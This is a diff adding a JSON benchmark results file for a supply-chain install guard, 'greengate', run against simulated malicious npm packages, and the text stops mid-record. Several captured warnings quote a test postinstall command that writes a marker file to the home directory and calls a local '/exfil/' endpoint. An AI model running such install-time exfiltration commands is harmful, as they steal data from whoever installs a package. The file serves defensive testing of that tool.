@@ -1,0 +1,1387 @@
+{
+  "version": "greengate 0.4.0",
+  "repeats": 3,
+  "platform": "Linux-7.2.8-200.fc44.x86_64-x86_64-with-glibc2.43",
+  "python": "3.14.7",
+  "binary_sha256": "ad37ddc7f85e09c07b99cfe4400afe89430cc8c6d232b123e8b5fbaef836c116",
+  "modes": [
+    "bwrap",
+    "none"
+  ],
+  "results": [
+    {
+      "id": "npm-transitive-postinstall",
+      "label": "malicious",
+      "eco": "npm",
+      "description": "`npm ci`: a transitive dependency's postinstall steals $HOME and phones home; nothing is named on the command line",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 0.63,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 212ms\n\u2139\ufe0f  Running install scripts of evil-helper@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] evil-helper@1.0.0 \u2014 postinstall: `node -e \"try{require('fs').writeFileSync(require('os').homedir()+'/pwned-npm-transitive-postinstall','x')}catch(e){};fetch('http://127.0.0.1:34107/exfil/npm-transitive-postinstall').catch(()=>{})\"` \u2014 fetch( \u2014 runs isolated\n  install:plan \u2014 2 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 2 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: evil-helper@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 0.63,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 215ms\n\u2139\ufe0f  Running install scripts of evil-helper@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] evil-helper@1.0.0 \u2014 postinstall: `node -e \"try{require('fs').writeFileSync(require('os').homedir()+'/pwned-npm-transitive-postinstall','x')}catch(e){};fetch('http://127.0.0.1:34107/exfil/npm-transitive-postinstall').catch(()=>{})\"` \u2014 fetch( \u2014 runs isolated\n  install:plan \u2014 2 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 2 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: evil-helper@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 0.63,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 217ms\n\u2139\ufe0f  Running install scripts of evil-helper@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] evil-helper@1.0.0 \u2014 postinstall: `node -e \"try{require('fs').writeFileSync(require('os').homedir()+'/pwned-npm-transitive-postinstall','x')}catch(e){};fetch('http://127.0.0.1:34107/exfil/npm-transitive-postinstall').catch(()=>{})\"` \u2014 fetch( \u2014 runs isolated\n  install:plan \u2014 2 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 2 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: evil-helper@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+          }
+        ],
+        "none": [
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.27,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 217ms\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousScript] evil-helper@1.0.0 \u2014 postinstall: `node -e \"try{require('fs').writeFileSync(require('os').homedir()+'/pwned-npm-transitive-postinstall','x')}catch(e){};fetch('http://127.0.0.1:34107/exfil/npm-transitive-postinstall').catch(()=>{})\"` \u2014 fetch( \u2014 not run (no isolation available; allowlist it to run it)\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.28,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 223ms\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousScript] evil-helper@1.0.0 \u2014 postinstall: `node -e \"try{require('fs').writeFileSync(require('os').homedir()+'/pwned-npm-transitive-postinstall','x')}catch(e){};fetch('http://127.0.0.1:34107/exfil/npm-transitive-postinstall').catch(()=>{})\"` \u2014 fetch( \u2014 not run (no isolation available; allowlist it to run it)\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 1,
+            "seconds": 0.27,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/SuspiciousScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 213ms\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/SuspiciousScript] evil-helper@1.0.0 \u2014 postinstall: `node -e \"try{require('fs').writeFileSync(require('os').homedir()+'/pwned-npm-transitive-postinstall','x')}catch(e){};fetch('http://127.0.0.1:34107/exfil/npm-transitive-postinstall').catch(()=>{})\"` \u2014 fetch( \u2014 not run (no isolation available; allowlist it to run it)\n"
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "nothing to look up",
+          "exit_code": 0,
+          "seconds": 0.63,
+          "effect": false,
+          "works": null,
+          "status": "passed",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 220ms\n\u2139\ufe0f  Running install scripts of evil-helper@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] evil-helper@1.0.0 \u2014 postinstall: `node -e \"try{require('fs').writeFileSync(require('os').homedir()+'/pwned-npm-transitive-postinstall','x')}catch(e){};fetch('http://127.0.0.1:34107/exfil/npm-transitive-postinstall').catch(()=>{})\"` \u2014 fetch( \u2014 runs isolated\n  install:plan \u2014 2 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 2 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: evil-helper@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+        }
+      ]
+    },
+    {
+      "id": "npm-new-install-script",
+      "label": "malicious",
+      "eco": "npm",
+      "description": "An established package's new version adds a postinstall the previous one did not have",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.25,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/NewInstallScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 203ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/NewInstallScript] colorize@1.0.1 (/tmp/greengate-install-77551-1791818558371836665/project/package-lock.json) \u2014 runs code at install time; 1.0.0 did not (upgraded from 1.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.27,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/NewInstallScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 216ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/NewInstallScript] colorize@1.0.1 (/tmp/greengate-install-77603-1791818558871106518/project/package-lock.json) \u2014 runs code at install time; 1.0.0 did not (upgraded from 1.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.29,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/NewInstallScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 233ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/NewInstallScript] colorize@1.0.1 (/tmp/greengate-install-77654-1791818559407066357/project/package-lock.json) \u2014 runs code at install time; 1.0.0 did not (upgraded from 1.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          }
+        ],
+        "none": [
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.28,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/NewInstallScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 219ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/NewInstallScript] colorize@1.0.1 (/tmp/greengate-install-77689-1791818559974603959/project/package-lock.json) \u2014 runs code at install time; 1.0.0 did not (upgraded from 1.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.26,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/NewInstallScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 207ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/NewInstallScript] colorize@1.0.1 (/tmp/greengate-install-77724-1791818560517153005/project/package-lock.json) \u2014 runs code at install time; 1.0.0 did not (upgraded from 1.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.26,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/NewInstallScript"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 210ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/NewInstallScript] colorize@1.0.1 (/tmp/greengate-install-77774-1791818561047941021/project/package-lock.json) \u2014 runs code at install time; 1.0.0 did not (upgraded from 1.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.25,
+          "effect": false,
+          "works": null,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 206ms\n\u2139\ufe0f  1 package(s) from private registries: release metadata not checked.\n\n\u26a0\ufe0f  install: 1 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] osv-db:npm \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:44707/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+        }
+      ]
+    },
+    {
+      "id": "npm-provenance-regression",
+      "label": "malicious",
+      "eco": "npm",
+      "description": "A new version without the publish provenance every earlier one had, carrying a payload",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.27,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/ProvenanceRegression"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 216ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/ProvenanceRegression] signed-lib@2.0.1 (/tmp/greengate-install-77859-1791818562085425848/project/package-lock.json) \u2014 has no publish provenance; 2.0.0 did (upgraded from 2.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.28,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/ProvenanceRegression"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 224ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/ProvenanceRegression] signed-lib@2.0.1 (/tmp/greengate-install-77907-1791818562626578837/project/package-lock.json) \u2014 has no publish provenance; 2.0.0 did (upgraded from 2.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.27,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/ProvenanceRegression"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 214ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/ProvenanceRegression] signed-lib@2.0.1 (/tmp/greengate-install-78138-1791818563169934934/project/package-lock.json) \u2014 has no publish provenance; 2.0.0 did (upgraded from 2.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          }
+        ],
+        "none": [
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.26,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/ProvenanceRegression"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 213ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/ProvenanceRegression] signed-lib@2.0.1 (/tmp/greengate-install-78174-1791818563695448963/project/package-lock.json) \u2014 has no publish provenance; 2.0.0 did (upgraded from 2.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.27,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/ProvenanceRegression"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 215ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/ProvenanceRegression] signed-lib@2.0.1 (/tmp/greengate-install-78209-1791818564224113737/project/package-lock.json) \u2014 has no publish provenance; 2.0.0 did (upgraded from 2.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.26,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "RELEASE/ProvenanceRegression"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 211ms\n\n\ud83d\udea8 1 policy violation(s):\n  [RELEASE/ProvenanceRegression] signed-lib@2.0.1 (/tmp/greengate-install-78246-1791818564751702499/project/package-lock.json) \u2014 has no publish provenance; 2.0.0 did (upgraded from 2.0.0)\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.29,
+          "effect": false,
+          "works": null,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 230ms\n\u2139\ufe0f  1 package(s) from private registries: release metadata not checked.\n\n\u26a0\ufe0f  install: 1 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] osv-db:npm \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:43285/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+        }
+      ]
+    },
+    {
+      "id": "npm-tamper-other-package",
+      "label": "malicious",
+      "eco": "npm",
+      "description": "A postinstall rewrites another package's index.js",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 0.73,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 283ms\n\u2139\ufe0f  Running install scripts of tamper@1.0.0...\n  install:plan \u2014 2 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 2 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: tamper@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 0.64,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 241ms\n\u2139\ufe0f  Running install scripts of tamper@1.0.0...\n  install:plan \u2014 2 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 2 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: tamper@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+          },
+          {
+            "outcome": "prevented",
+            "exit_code": 0,
+            "seconds": 0.89,
+            "effect": false,
+            "works": null,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 365ms\n\u2139\ufe0f  Running install scripts of tamper@1.0.0...\n  install:plan \u2014 2 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 2 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: tamper@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+          }
+        ],
+        "none": [
+          {
+            "outcome": "after",
+            "exit_code": 1,
+            "seconds": 0.85,
+            "effect": true,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/ForeignWrite"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 317ms\n\u2139\ufe0f  Running install scripts of tamper@1.0.0...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/ForeignWrite] tamper@1.0.0 \u2014 its install script modified 1 file(s) outside its package: node_modules/victim/index.js\n"
+          },
+          {
+            "outcome": "after",
+            "exit_code": 1,
+            "seconds": 0.78,
+            "effect": true,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/ForeignWrite"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 264ms\n\u2139\ufe0f  Running install scripts of tamper@1.0.0...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/ForeignWrite] tamper@1.0.0 \u2014 its install script modified 1 file(s) outside its package: node_modules/victim/index.js\n"
+          },
+          {
+            "outcome": "after",
+            "exit_code": 1,
+            "seconds": 0.85,
+            "effect": true,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "INSTALL/ForeignWrite"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 295ms\n\u2139\ufe0f  Running install scripts of tamper@1.0.0...\n\n\ud83d\udea8 Install-time violations:\n  [INSTALL/ForeignWrite] tamper@1.0.0 \u2014 its install script modified 1 file(s) outside its package: node_modules/victim/index.js\n"
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "nothing to look up",
+          "exit_code": 0,
+          "seconds": 0.77,
+          "effect": false,
+          "works": null,
+          "status": "passed",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 2 packages in 266ms\n\u2139\ufe0f  Running install scripts of tamper@1.0.0...\n  install:plan \u2014 2 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 2 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: tamper@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+        }
+      ]
+    },
+    {
+      "id": "npm-dependency-confusion",
+      "label": "malicious",
+      "eco": "npm",
+      "description": "A private-scope package (@acme/*) resolves from the public registry",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.34,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "REGISTRY/DependencyConfusion"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 260ms\n\n\ud83d\udea8 1 policy violation(s):\n  [REGISTRY/DependencyConfusion] @acme/billing@1.0.0 (/tmp/greengate-install-80688-1791818573388425782/project/package-lock.json) \u2014 declared internal, but resolves from the public registry https://registry.npmjs.org\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.32,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "REGISTRY/DependencyConfusion"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 248ms\n\n\ud83d\udea8 1 policy violation(s):\n  [REGISTRY/DependencyConfusion] @acme/billing@1.0.0 (/tmp/greengate-install-80767-1791818573729872715/project/package-lock.json) \u2014 declared internal, but resolves from the public registry https://registry.npmjs.org\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.35,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "REGISTRY/DependencyConfusion"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 273ms\n\n\ud83d\udea8 1 policy violation(s):\n  [REGISTRY/DependencyConfusion] @acme/billing@1.0.0 (/tmp/greengate-install-80932-1791818574054584034/project/package-lock.json) \u2014 declared internal, but resolves from the public registry https://registry.npmjs.org\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          }
+        ],
+        "none": [
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.35,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "REGISTRY/DependencyConfusion"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 282ms\n\n\ud83d\udea8 1 policy violation(s):\n  [REGISTRY/DependencyConfusion] @acme/billing@1.0.0 (/tmp/greengate-install-81099-1791818574401285143/project/package-lock.json) \u2014 declared internal, but resolves from the public registry https://registry.npmjs.org\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.38,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "REGISTRY/DependencyConfusion"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 285ms\n\n\ud83d\udea8 1 policy violation(s):\n  [REGISTRY/DependencyConfusion] @acme/billing@1.0.0 (/tmp/greengate-install-81293-1791818574756149617/project/package-lock.json) \u2014 declared internal, but resolves from the public registry https://registry.npmjs.org\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          },
+          {
+            "outcome": "preflight",
+            "exit_code": 1,
+            "seconds": 0.39,
+            "effect": false,
+            "works": null,
+            "status": "findings",
+            "rules": [
+              "REGISTRY/DependencyConfusion"
+            ],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\nup to date in 314ms\n\n\ud83d\udea8 1 policy violation(s):\n  [REGISTRY/DependencyConfusion] @acme/billing@1.0.0 (/tmp/greengate-install-81481-1791818575140019197/project/package-lock.json) \u2014 declared internal, but resolves from the public registry https://registry.npmjs.org\nInstall halted at the plan: nothing was downloaded and no package code ran.\n"
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.35,
+          "effect": false,
+          "works": null,
+          "status": "incomplete",
+          "rules": [],
